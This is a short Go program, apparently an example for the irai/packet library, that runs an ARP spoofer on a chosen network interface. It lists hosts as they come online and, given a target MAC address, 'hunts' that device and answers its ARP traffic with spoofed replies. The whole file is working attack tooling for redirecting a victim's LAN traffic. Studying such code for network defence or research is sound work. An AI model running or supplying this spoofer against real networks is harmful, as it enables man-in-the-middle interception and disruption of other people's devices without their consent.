package main

import (
	"flag"
	"fmt"
	"net"

	"github.com/irai/packet"
	"github.com/irai/packet/arp"
)

// Simple utility to demonstrate use of ARP spoofing
var (
	nic    = flag.String("i", "eth0", "nic interface")
	macstr = flag.String("mac", "", "mac address as in xx:xx:xx:xx:xx:xx")
	debug  = flag.Bool("d", false, "set to true to show debug messages")
)

func main() {
	var err error
	var mac net.HardwareAddr
	flag.Parse()

	if mac, err = net.ParseMAC(*macstr); err != nil {
		fmt.Println("missing or invalid target mac address...listening only", err)
		flag.PrintDefaults()
	}

	fmt.Println("setting up nic: ", *nic)
	s, err := packet.NewSession(*nic)
	if err != nil {
		fmt.Printf("conn error: %s", err)
		return
	}

	go func() {
		for {
			notification := <-s.C
			switch notification.Online {
			case true:
				fmt.Printf("is online: %s\n", notification)
			default:
				fmt.Printf("is offline: %s\n", notification)
			}
			s.PrintTable()
		}
	}()

	arp.Debug = *debug
	packet.Debug = *debug
	arpspoofer, err := arp.New(s)
	if err != nil {
		fmt.Println("error creating arp spoofer", err)
		return
	}
	arpspoofer.Start()
	if mac != nil {
		arpspoofer.StartHunt(packet.Addr{MAC: mac, IP: nil})
	}
	defer arpspoofer.Stop()

	buffer := make([]byte, packet.EthMaxSize)
	for {
		n, _, err := s.ReadFrom(buffer)
		if err != nil {
			fmt.Println("error reading packet", err)
			return
		}

		frame, err := s.Parse(buffer[:n])
		if err != nil {
			fmt.Println("parse error", err)
			continue
		}

		// Process ARP packets only - ignore all other
		if arp := frame.ARP(); arp != nil {
			arpspoofer.Spoof(frame)
		}

		s.SetOnline(frame.Host)
	}
}
